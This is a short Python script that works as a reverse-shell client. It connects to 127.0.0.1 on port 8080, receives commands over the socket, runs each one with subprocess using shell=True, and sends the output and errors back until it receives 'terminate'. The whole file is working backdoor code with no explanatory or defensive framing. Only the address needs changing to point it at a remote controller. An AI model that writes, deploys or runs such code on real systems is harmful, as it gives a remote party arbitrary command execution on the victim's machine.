import socket, subprocess

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #create socket
    s.connect(("127.0.0.1",8080)) #connect to the socket

    while True:
        command = s.recv(1024).decode("utf8") #command send from the server

        if "terminate" in command: #if "terminate" close the connection
            s.close()
            break
        else: #open a shell and execute the command
            SHELL = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
            stdin=subprocess.PIPE) #shell object, that executes the command
            s.send(SHELL.stdout.read()) #send the stdout to the server
            s.send(SHELL.stderr.read()) #send the stderr to the server



def main():
    connect()
main()
